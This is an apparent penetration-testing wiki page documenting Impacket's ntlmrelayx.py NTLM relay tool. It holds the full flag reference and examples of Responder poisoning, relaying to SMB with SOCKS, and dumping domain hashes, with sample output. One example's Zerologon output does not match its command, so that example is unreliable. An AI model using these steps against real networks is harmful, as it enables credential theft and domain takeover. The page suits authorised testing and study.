---
title : "ntlmrelayx.py"
# pre : ' '
description : "For every connection received, this module will try to relay that connection to specified target(s) system or the original client."
date : 2022-02-14T11:56:40+01:00
# hidden : true
# draft : true
weight : 60
# tags : ['']
---

---

For every connection received, this module will try to relay that connection to specified target(s) system or the original client.

## Installation

Install [Impacket]({{< ref "../impacket" >}}).

## Usage

```plain
ntlmrelayx.py [-h] [-ts] [-debug] [-t TARGET] [-tf TARGETSFILE] [-w] [-i] [-ip INTERFACE_IP] [--no-smb-server] [--no-http-server] [--no-wcf-server] [--no-raw-server] [--no-rpc-server] [--smb-port SMB_PORT]
                     [--http-port HTTP_PORT] [--wcf-port WCF_PORT] [--raw-port RAW_PORT] [--rpc-port RPC_PORT] [--no-multirelay] [--keep-relaying] [-ra] [-r SMBSERVER] [-l LOOTDIR] [-of OUTPUT_FILE] [-dh]
                     [-codec CODEC] [-smb2support] [-ntlmchallenge NTLMCHALLENGE] [-socks] [-socks-address SOCKS_ADDRESS] [-socks-port SOCKS_PORT] [-http-api-port HTTP_API_PORT] [-wh WPAD_HOST] [-wa WPAD_AUTH_NUM] [-6]
                     [--remove-mic] [--serve-image SERVE_IMAGE] [-c COMMAND] [-e FILE] [--enum-local-admins] [--rpc-attack {None,TSCH,ICPR}] [-rpc-mode {TSCH,ICPR}] [-rpc-use-smb]
                     [-auth-smb [domain/]username[:password]] [-hashes-smb LMHASH:NTHASH] [-rpc-smb-port {139,445}] [-icpr-ca-name ICPR_CA_NAME] [-q QUERY] [-machine-account MACHINE_ACCOUNT]
                     [-machine-hashes LMHASH:NTHASH] [-domain DOMAIN] [-remove-target] [--no-dump] [--no-da] [--no-acl] [--no-validate-privs] [--escalate-user ESCALATE_USER] [--delegate-access] [--sid] [--dump-laps]
                     [--dump-gmsa] [--dump-adcs] [--add-dns-record NAME IPADDR] [--add-computer [COMPUTERNAME [PASSWORD ...]]] [-k KEYWORD] [-m MAILBOX] [-a] [-im IMAP_MAX] [--adcs] [--template TEMPLATE]
                     [--altname ALTNAME] [--shadow-credentials] [--shadow-target SHADOW_TARGET] [--pfx-password PFX_PASSWORD] [--export-type {PEM,PFX}] [--cert-outfile-path CERT_OUTFILE_PATH] [--sccm-policies]
                     [--sccm-policies-clientname SCCM_POLICIES_CLIENTNAME] [--sccm-policies-sleep SCCM_POLICIES_SLEEP] [--sccm-dp] [--sccm-dp-extensions SCCM_DP_EXTENSIONS] [--sccm-dp-files SCCM_DP_FILES]
```

## Flags

```plain
Impacket v0.13.0.dev0+20250820.203717.835623ae - Copyright Fortra, LLC and its affiliated companies 

For every connection received, this module will try to relay that connection to specified target(s) system or the original client

Main options:
  -h, --help            show this help message and exit
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON
  -t TARGET, --target TARGET
                        Target to relay the credentials to, can be an IP, hostname or URL like domain\username@host:port (domain\username and port are optional, and don't forget to escape the '\'). If unspecified, it
                        will relay back to the client')
  -tf TARGETSFILE       File that contains targets by hostname or full URL, one per line
  -w                    Watch the target file for changes and update target list automatically (only valid with -tf)
  -i, --interactive     Launch an smbclient, LDAP console or SQL shell insteadof executing a command after a successful relay. This console will listen locally on a tcp port and can be reached with for example netcat.
  -ip INTERFACE_IP, --interface-ip INTERFACE_IP
                        IP address of interface to bind SMB and HTTP servers
  --smb-port SMB_PORT   Port to listen on smb server
  --http-port HTTP_PORT
                        Port(s) to listen on HTTP server. Can specify multiple ports by separating them with `,`, and ranges with `-`. Ex: `80,8000-8010`
  --wcf-port WCF_PORT   Port to listen on wcf server
  --raw-port RAW_PORT   Port to listen on raw server
  --rpc-port RPC_PORT   Port to listen on rpc server
  --no-multirelay       If set, disable multi-host relay (SMB and HTTP servers)
  --keep-relaying       If set, keeps relaying to a target even after a successful connection on it
  -ra, --random         Randomize target selection
  -r SMBSERVER          Redirect HTTP requests to a file:// path on SMBSERVER
  -l LOOTDIR, --lootdir LOOTDIR
                        Loot directory in which gathered loot such as SAM dumps will be stored (default: current directory).
  -of OUTPUT_FILE, --output-file OUTPUT_FILE
                        base output filename for encrypted hashes. Suffixes will be added for ntlm and ntlmv2
  -dh, --dump-hashes    show encrypted hashes in the console
  -codec CODEC          Sets encoding used (codec) from the target's output (default "utf-8"). If errors are detected, run chcp.com at the target, map the result with
                        https://docs.python.org/3/library/codecs.html#standard-encodings and then execute ntlmrelayx.py again with -codec and the corresponding codec
  -smb2support          SMB2 Support
  -ntlmchallenge NTLMCHALLENGE
                        Specifies the NTLM server challenge used by the SMB Server (16 hex bytes long. eg: 1122334455667788)
  -socks                Launch a SOCKS proxy for the connection relayed
  -socks-address SOCKS_ADDRESS
                        SOCKS5 server address (also used for HTTP API)
  -socks-port SOCKS_PORT
                        SOCKS5 server port
  -http-api-port HTTP_API_PORT
                        SOCKS5 HTTP API port
  -wh WPAD_HOST, --wpad-host WPAD_HOST
                        Enable serving a WPAD file for Proxy Authentication attack, setting the proxy host to the one supplied.
  -wa WPAD_AUTH_NUM, --wpad-auth-num WPAD_AUTH_NUM
                        Prompt for authentication N times for clients without MS16-077 installed before serving a WPAD file. (default=1)
  -6, --ipv6            Listen on both IPv6 and IPv4
  --remove-mic          Remove MIC (exploit CVE-2019-1040)
  --serve-image SERVE_IMAGE
                        local path of the image that will we returned to clients
  -c COMMAND            Command to execute on target system (for SMB and RPC). If not specified for SMB, hashes will be dumped (secretsdump.py must be in the same directory). For RPC no output will be provided.

  --no-smb-server       Disables the SMB server
  --no-http-server      Disables the HTTP server
  --no-wcf-server       Disables the WCF server
  --no-raw-server       Disables the RAW server
  --no-rpc-server       Disables the RPC server

SMB client options:
  -e FILE               File to execute on the target system. If not specified, hashes will be dumped (secretsdump.py must be in the same directory)
  --enum-local-admins   If relayed user is not admin, attempt SAMR lookup to see who is (only works pre Win 10 Anniversary)
  --rpc-attack {None,TSCH,ICPR}
                        Select the attack to perform over RPC over named pipes.

RPC client options:
  -rpc-mode {TSCH,ICPR}
                        Protocol to attack
  -rpc-use-smb          Relay DCE/RPC to SMB pipes
  -auth-smb [domain/]username[:password]
                        Use this credential to authenticate to SMB (low-privilege account)
  -hashes-smb LMHASH:NTHASH
  -rpc-smb-port {139,445}
                        Destination port to connect to SMB
  -icpr-ca-name ICPR_CA_NAME
                        Name of the CA for ICPR attack

MSSQL client options:
  -q QUERY, --query QUERY
                        MSSQL query to execute(can specify multiple)

HTTP options:
  -machine-account MACHINE_ACCOUNT
                        Domain machine account to use when interacting with the domain to grab a session key for signing, format is domain/machine_name
  -machine-hashes LMHASH:NTHASH
                        Domain machine hashes, format is LMHASH:NTHASH
  -domain DOMAIN        Domain FQDN or IP to connect using NETLOGON
  -remove-target        Try to remove the target in the challenge message (in case CVE-2019-1019 patch is not installed)

LDAP client options:
  --no-dump             Do not attempt to dump LDAP information
  --no-da               Do not attempt to add a Domain Admin
  --no-acl              Disable ACL attacks
  --no-validate-privs   Do not attempt to enumerate privileges, assume permissions are granted to escalate a user via ACL attacks
  --escalate-user ESCALATE_USER
                        Escalate privileges of this user instead of creating a new one
  --delegate-access     Delegate access on relayed computer account to the specified account
  --sid                 Use a SID to delegate access rather than an account name
  --dump-laps           Attempt to dump any LAPS passwords readable by the user
  --dump-gmsa           Attempt to dump any gMSA passwords readable by the user
  --dump-adcs           Attempt to dump ADCS enrollment services and certificate templates info
  --add-dns-record NAME IPADDR
                        Add the <NAME> record to DNS via LDAP pointing to <IPADDR>

Common options for SMB and LDAP:
  --add-computer [COMPUTERNAME [PASSWORD ...]]
                        Attempt to add a new computer account via SMB or LDAP, depending on the specified target. This argument can be used either with the LDAP or the SMB service, as long as the target is a domain
                        controller.

IMAP client options:
  -k KEYWORD, --keyword KEYWORD
                        IMAP keyword to search for. If not specified, will search for mails containing "password"
  -m MAILBOX, --mailbox MAILBOX
                        Mailbox name to dump. Default: INBOX
  -a, --all             Instead of searching for keywords, dump all emails
  -im IMAP_MAX, --imap-max IMAP_MAX
                        Max number of emails to dump (0 = unlimited, default: no limit)

AD CS attack options:
  --adcs                Enable AD CS relay attack
  --template TEMPLATE   AD CS template. Defaults to Machine or User whether relayed account name ends with `$`. Relaying a DC should require specifying `DomainController`
  --altname ALTNAME     Subject Alternative Name to use when performing ESC1 or ESC6 attacks.

Shadow Credentials attack options:
  --shadow-credentials  Enable Shadow Credentials relay attack (msDS-KeyCredentialLink manipulation for PKINIT pre-authentication)
  --shadow-target SHADOW_TARGET
                        target account (user or computer$) to populate msDS-KeyCredentialLink from
  --pfx-password PFX_PASSWORD
                        password for the PFX stored self-signed certificate (will be random if not set, not needed when exporting to PEM)
  --export-type {PEM,PFX}
                        choose to export cert+private key in PEM or PFX (i.e. #PKCS12) (default: PFX))
  --cert-outfile-path CERT_OUTFILE_PATH
                        filename to store the generated self-signed PEM or PFX certificate and key

SCCM Policies attack options:
  --sccm-policies       Enable SCCM policies attack. Performs SCCM secret policies dump from a Management Point by registering a device. Works best when relaying a machine account. Expects as target
                        'http://<MP>/ccm_system_windowsauth/request'
  --sccm-policies-clientname SCCM_POLICIES_CLIENTNAME
                        The name of the client that will be registered in order to dump secret policies. Defaults to the relayed account's name
  --sccm-policies-sleep SCCM_POLICIES_SLEEP
                        The number of seconds to sleep after the client registration before requesting secret policies

SCCM Distribution Point attack options:
  --sccm-dp             Enable SCCM Distribution Point attack. Perform package file dump from an SCCM Distribution Point. Expects as target 'http://<DP>/sms_dp_smspkg$/Datalib'
  --sccm-dp-extensions SCCM_DP_EXTENSIONS
                        A custom list of extensions to look for when downloading files from the SCCM Distribution Point. If not provided, defaults to .ps1,.bat,.xml,.txt,.pfx
  --sccm-dp-files SCCM_DP_FILES
                        The path to a file containing a list of specific URLs to download from the Distribution Point, instead of downloading by extensions. Providing this argument will skip file indexing
```

## Examples

For every connection received, this module will try to relay that connection
to specified target(s) system or (by default) the original client

Start Responder.py and turn off HTTP and SMB server. Also start [PCredz]({{< ref "pcredz" >}}) in listening mode (`sudo python3 Pcredz -i eth0`).

```plain
$ sudo python3 Responder.py -I enp0s31f6
[...]
[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
   WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
[...]
```

### Default config

By default NTLMrelayx.py relays to the client who sends the hash, dumping SAM. It's recommended to use `-socks` so if authentication was succesful a socks connection is set up. This way you can use tooling thru for example ProxyChains.

```plain
$ sudo ntlmrelayx.py -smb2support -socks -of captured-hashes
Impacket v0.9.22.dev1+20200924.183326.65cf657f - Copyright 2020 SecureAuth Corporation
[...]
[*] Servers started, waiting for connections
[*] SMBD-Thread-3: Connection from offsec/ADMINISTRATOR@10.10.10.11 controlled, attacking target smb://10.10.10.10
[*] Connecting to 10.10.10.10 NETLOGON service
[*] SMB Auth OK, successfully
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
```

### Targeted SMB

Start ntlmrelayx.py with the target system in place.

```plain
$ sudo ntlmrelayx.py -t 10.10.10.10 -smb2support -socks
Impacket v0.9.22.dev1+20200924.183326.65cf657f - Copyright 2020 SecureAuth Corporation
[...]
[*] Servers started, waiting for connections
[*] SMBD-Thread-3: Connection from offsec/ADMINISTRATOR@10.10.10.11 controlled, attacking target dcsync://10.10.10.10
[*] Connecting to 10.10.10.10 NETLOGON service
[*] Netlogon Auth OK, successfully bypassed autentication using Zerologon after 1 attempts!
[*] offsec\Administrator successfully validated through NETLOGON
[*] NTLM Sign/seal key: cf65d6660ec15d940f687bde79572094[...]
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
[...]
```

### Generate targetlist and attack

To use NTLMrelayx.py with a list of targets you want to relay to, first generate a list with [CrackMapExec]({{< ref "tools/framework/crackmapexec" >}}) by using the command below.

```plain
crackmapexec smb 192.168.10.0/24 --gen-relay-list targetlist
```

Then you can use the `-tf` flag with NTLMrelayx.py to use the targetlist created as input file.

### SOCKS

As described it is recommended to use `-socks` so if authentication was successful a socks connection is set up. This way you can use tooling thru for example ProxyChains.

```plain
ntlmrelayx> socks
Protocol    Target          Username            AdminStatus     Port
--------    ------          --------            -----------     ----
SMB         10.10.10.1      OFFSEC/JOHNDO       TRUE            445
SMB         10.10.10.2      OFFSEC/JOHNDO       FALSE           445
```

## URL List

- [Github.com - ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
